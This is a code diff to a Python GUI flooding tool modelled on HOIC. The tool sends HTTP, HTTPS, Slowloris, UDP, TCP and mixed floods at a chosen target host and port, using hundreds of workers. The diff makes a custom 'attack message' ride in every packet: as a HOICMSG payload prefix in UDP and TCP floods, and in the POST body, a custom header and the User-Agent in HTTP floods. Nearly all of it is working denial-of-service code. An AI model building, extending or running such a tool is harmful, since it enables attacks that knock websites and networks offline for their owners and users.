@@ -23,6 +23,7 @@ from dataclasses import dataclass, field
 from typing import Optional, List, Dict, Any
 import os
 import sys
+from urllib.parse import quote_plus
 
 try:
     from PIL import Image as PILImage
@@ -91,13 +92,21 @@ ATTACK_MODES = [
     "Adaptive Saturation Seeker",
 ]
 
-MESSAGE_SUPPORTED_MODES = {
+HTTP_MESSAGE_MODES = {
     "HTTP Flood",
     "HTTPS Flood",
     "Slowloris (HTTP)",
     "Mixed (HTTP + UDP)",
     "Adaptive Saturation Seeker",
 }
+
+PAYLOAD_MESSAGE_MODES = {
+    "UDP Flood",
+    "TCP Flood",
+    "Mixed (HTTP + UDP)",
+}
+
+MESSAGE_SUPPORTED_MODES = HTTP_MESSAGE_MODES | PAYLOAD_MESSAGE_MODES
 
 WORKERS_MIN = 5
 WORKERS_MAX = 800
@@ -131,6 +140,26 @@ class AttackConfig:
 def make_payload(size: int) -> bytes:
     """Generate random payload bytes for flood packets."""
     return os.urandom(max(1, size))
+
+
+def message_is_set(message: str) -> bool:
+    return bool(sanitize_http_header_value(message))
+
+
+def embed_message_in_payload(size: int, message: str) -> bytes:
+    """Prefix UDP/TCP payloads with a cleartext ASCII marker visible in packet captures."""
+    msg = sanitize_http_header_value(message)
+    if not msg:
+        return make_payload(size)
+    prefix = f"HOICMSG:{msg}|".encode("ascii", errors="ignore")
+    if len(prefix) >= size:
+        return prefix[: max(1, size)]
+    return prefix + os.urandom(size - len(prefix))
+
+
+def build_message_post_body(message: str) -> bytes:
+    msg = sanitize_http_header_value(message)
+    return f"hoic_message={quote_plus(msg)}".encode("ascii")
 
 
 def normalize_worker_count(
@@ -171,7 +200,17 @@ def apply_message_to_headers(headers: dict, message: str) -> dict:
         return headers
     updated = headers.copy()
     updated["X-HOIC-Message"] = msg
+    if "User-Agent" in updated:
+        updated["User-Agent"] = f"{updated['User-Agent']} [HOIC:{msg}]"
     return updated
+
+
+def mode_uses_http_message(mode: str) -> bool:
+    return mode in HTTP_MESSAGE_MODES
+
+
+def mode_uses_payload_message(mode: str) -> bool:
+    return mode in PAYLOAD_MESSAGE_MODES
 
 
 def apply_message_to_params(params: dict, message: str) -> dict:
@@ -346,8 +385,23 @@ class AttackController:
 
         self.log_msg(f"Starting {cfg.mode} against {cfg.target_host}:{cfg.target_port}")
         self.log_msg(f"Workers: {cfg.workers} | Duration: {cfg.duration}s | Packet size: {cfg.packet_size}")
-        if cfg.attack_message and mode_supports_message(cfg.mode):
+        if message_is_set(cfg.attack_message):
             self.log_msg(f"Attack message: {sanitize_http_header_value(cfg.attack_message)}")
+            if mode_uses_http_message(cfg.mode) and (
+                cfg.mode == "HTTPS Flood" or cfg.use_https
+            ):
+                self.log_msg(
+                    "HTTPS/TLS mode: message is encrypted on the wire — "
+                    "use HTTP Flood for cleartext packet capture, or decrypt TLS in Wireshark",
+                    "WARN",
+                )
+            elif mode_uses_payload_message(cfg.mode):
+                self.log_msg("Message embedded as HOICMSG: prefix in packet payloads (visible in capture)", "INFO")
+            elif mode_uses_http_message(cfg.mode):
+                self.log_msg(
+                    "Message sent in HTTP POST body, X-HOIC-Message header, and User-Agent (cleartext)",
+                    "INFO",
+                )
 
         if cfg.mode in ("HTTP Flood", "HTTPS Flood"):
             self._start_http(cfg)
@@ -443,18 +497,7 @@ class AttackController:
                             h["Referer"] = random.choice(REFERERS)
 
                         t0 = time.perf_counter()
-                        if cfg.method == "POST":
-                            data = os.urandom(random.randint(128, cfg.packet_size))
-                            async with session.post(url, headers=h, data=data) as resp:
-                                await resp.read()
-                        else:
-                            params = apply_message_to_params(
-                                {"t": int(time.time() * 1000), "r": random.randint(100000, 999999)},
-                                cfg.attack_message,
-                            )
-                            async with session.get(url, headers=h, params=params) as resp:
-                                await resp.read()
-
+                        await self._send_http_request(session, url, cfg, h)
                         self.stats.record_latency((time.perf_counter() - t0) * 1000)
                         self.stats.record_sent()
                     except asyncio.CancelledError:
@@ -470,6 +513,34 @@ class AttackController:
             self.log_msg(f"HTTP worker pool error: {e}", "ERROR")
         finally:
             await connector.close()
+
+    async def _send_http_request(
+        self,
+        session: aiohttp.ClientSession,
+        url: str,
+        cfg: AttackConfig,
+        headers: dict,
+    ):
+        """Send HTTP request; embed message in POST body for cleartext capture visibility."""
+        msg = sanitize_http_header_value(cfg.attack_message)
+        h = headers.copy()
+        if msg:
+            h = apply_message_to_headers(h, msg)
+            h["Content-Type"] = "application/x-www-form-urlencoded"
+            body = build_message_post_body(msg)
+            async with session.post(url, headers=h, data=body) as resp:
+                await resp.read()
+        elif cfg.method == "POST":
+            data = os.urandom(random.randint(128, cfg.packet_size))
+            async with session.post(url, headers=h, data=data) as resp:
+                await resp.read()
+        else:
+            params = apply_message_to_params(
+                {"t": int(time.time() * 1000), "r": random.randint(100000, 999999)},
+                cfg.attack_message,
+            )
+            async with session.get(url, headers=h, params=params) as resp:
+                await resp.read()
 
     # ---------------- Adaptive Saturation Seeker ----------------
     def _start_saturation_seeker(self, cfg: AttackConfig):
@@ -569,12 +640,7 @@ class AttackController:
                         h = headers_base.copy()
                         h["X-HOIC-Probe"] = f"{wid}-{random.randint(1000, 999999)}"
                         t0 = time.perf_counter()
-                        params = apply_message_to_params(
-                            {"t": int(time.time() * 1000), "r": random.randint(100000, 999999)},
-                            cfg.attack_message,
-                        )
-                        async with session.get(url, headers=h, params=params) as resp:
-                            await resp.read()
+                        await self._send_http_request(session, url, cfg, h)
                         latencies.append((time.perf_counter() - t0) * 1000)
                         sent += 1
                         self.stats.record_sent()
@@ -625,12 +691,7 @@ class AttackController:
                         h = headers_base.copy()
                         h["X-HOIC-Resonance"] = f"{wid}-{random.randint(1000, 999999)}"
                         t0 = time.perf_counter()
-                        params = apply_message_to_params(
-                            {"t": int(time.time() * 1000), "r": random.randint(100000, 999999)},
-                            cfg.attack_message,
-                        )
-                        async with session.get(url, headers=h, params=params) as resp:
-                            await resp.read()
+                        await self._send_http_request(session, url, cfg, h)
                         self.stats.record_latency((time.perf_counter() - t0) * 1000)
                         self.stats.record_sent()
                     except asyncio.CancelledError:
@@ -674,7 +735,7 @@ class AttackController:
         def worker():
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65507)
-            payload = make_payload(cfg.packet_size)
+            payload = embed_message_in_payload(cfg.packet_size, cfg.attack_message)
             while not self.stop_event.is_set():
                 try:
                     sock.sendto(payload, (ip, cfg.target_port))
@@ -704,7 +765,7 @@ class AttackController:
                     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                     s.settimeout(4)
                     s.connect((ip, cfg.target_port))
-                    payload = make_payload(min(cfg.packet_size, 4096))
+                    payload = embed_message_in_payload(min(cfg.packet_size, 4096), cfg.attack_message)
                     for _ in range(3):
                         if self.stop_event.is_set():
                             break
@@ -810,7 +871,7 @@ class AttackController:
 
         def udp_w():
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            payload = make_payload(cfg.packet_size)
+            payload = embed_message_in_payload(cfg.packet_size, cfg.attack_message)
             while not self.stop_event.is_set():
                 try:
                     sock.sendto(payload, (ip, cfg.target_port))
@@ -954,15 +1015,17 @@ class HOICApp:
         self.size_entry.pack(anchor="w", padx=12, pady=2)
         self.size_entry.insert(0, "1400")
 
+        self.message_var = tk.StringVar(value="")
         self.message_label = ctk.CTkLabel(
             left,
-            text="ATTACK MESSAGE (HTTP modes only)",
+            text="ATTACK MESSAGE (embedded in packets)",
             font=ctk.CTkFont(size=13),
         )
         self.message_label.pack(anchor="w", padx=12, pady=(8, 0))
         self.message_entry = ctk.CTkEntry(
             left,
-            placeholder_text="Custom message sent as X-HOIC-Message header",
+            textvariable=self.message_var,
+            placeholder_text="Visible in HTTP body/headers or UDP/TCP payload prefix",
             width=260,
         )
         self.message_entry.pack(padx=12, pady=2)
@@ -1086,27 +1149,29 @@ class HOICApp:
         return normalize_worker_count(self.workers_slider.get())
 
     def _update_message_field_state(self, mode: str):
-        supported = mode_supports_message(mode)
-        if supported:
-            self.message_entry.configure(
-                state="normal",
-                text_color=("gray10", "gray90"),
-                placeholder_text="Custom message sent as X-HOIC-Message header",
-            )
-            self.message_label.configure(
-                text="ATTACK MESSAGE (HTTP modes only)",
-                text_color=("gray10", "gray90"),
-            )
+        http_mode = mode_uses_http_message(mode)
+        payload_mode = mode_uses_payload_message(mode)
+        self.message_entry.configure(
+            state="normal",
+            text_color=("gray10", "gray90"),
+        )
+        if http_mode and payload_mode:
+            hint = "HTTP POST body + headers; UDP uses HOICMSG: payload prefix"
+            label = "ATTACK MESSAGE (HTTP + UDP in mixed mode)"
+        elif http_mode:
+            if mode == "HTTPS Flood":
+                hint = "Sent in TLS-encrypted HTTP — use HTTP Flood for cleartext capture"
+            else:
+                hint = "Cleartext: POST body hoic_message=, X-HOIC-Message header, User-Agent"
+            label = "ATTACK MESSAGE (HTTP — visible in cleartext capture)"
+        elif payload_mode:
+            hint = "Prepended as ASCII HOICMSG:yourtext| in each packet payload"
+            label = "ATTACK MESSAGE (UDP/TCP payload prefix)"
         else:
-            self.message_entry.configure(
-                state="disabled",
-                text_color="#666666",
-                placeholder_text="Not available for UDP/TCP flood modes",
-            )
-            self.message_label.configure(
-                text="ATTACK MESSAGE (not supported for this mode)",
-                text_color="#666666",
-            )
+            hint = "Optional marker embedded in attack traffic"
+            label = "ATTACK MESSAGE"
+        self.message_entry.configure(placeholder_text=hint)
+        self.message_label.configure(text=label, text_color=("gray10", "gray90"))
 
     def show_legal_warning(self):
         result = messagebox.askokcancel(
@@ -1300,9 +1365,7 @@ class HOICApp:
         use_https = "HTTPS" in mode or (
             mode == "Adaptive Saturation Seeker" and port == 443
         )
-        attack_message = ""
-        if mode_supports_message(mode):
-            attack_message = self.message_entry.get().strip()
+        attack_message = self.message_var.get().strip()
 
         return AttackConfig(
             target_host=host,
